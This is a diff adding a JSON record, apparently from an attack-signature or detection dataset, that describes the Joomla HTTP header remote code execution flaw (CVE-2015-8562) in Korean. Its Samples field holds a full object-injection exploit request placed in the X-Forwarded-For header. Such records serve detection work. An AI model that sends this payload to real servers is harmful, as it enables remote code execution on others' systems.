@@ -1,0 +1,9 @@
+{
+        "Name": "Joomla HTTP Header Remote Code Execution",
+        "Description": "-세션 데이터에 비정상 HTTP Header의 문자열이 삽입되어 잘못된 세션 핸들러 과정에서 원격 실행 코드가 utf8_general_ci에 저장되어 임의의 코드가 실행되는 취약점\n-User-agent와 x-forwarded-for 헤더에 사용자의 PC 정보를 알려주는데 여기서 악의적인 코드를 삽입하여 공격",
+        "References": ["CVE-2015-8562"],
+        "Samples": ["GET / HTTP/1.1\nX-Forwarded-For: }__test|O:21:JDatabaseDriverMysqli:3:{s:2:fc;O:17:JSimplepieFactory:0:{}s:21:\\0\\0\\0disconnectHandlers;a:1:{i:0;a:2:{i:0;O:9:SimplePie:5:{s:8:sanitize;O:20:JDatabaseDriverMysql:0:\n{}s:8:feed_url;s:56:die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit;s:19:cache_name_function;s:6:assert;s:5:cache;b:1;s:11:cache_class;O:20:JDatabaseDriverMysql:0:\n{}}i:1;s:4:init;}}s:13:\\0\\0\\0connection;b:1;}ðýýý\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nHost: 211.34.79.24\nConnection: Keep-Alive\nCache-Control: no-cache"],
+        "Keywords": [],
+        "Signature":[]
+}
+
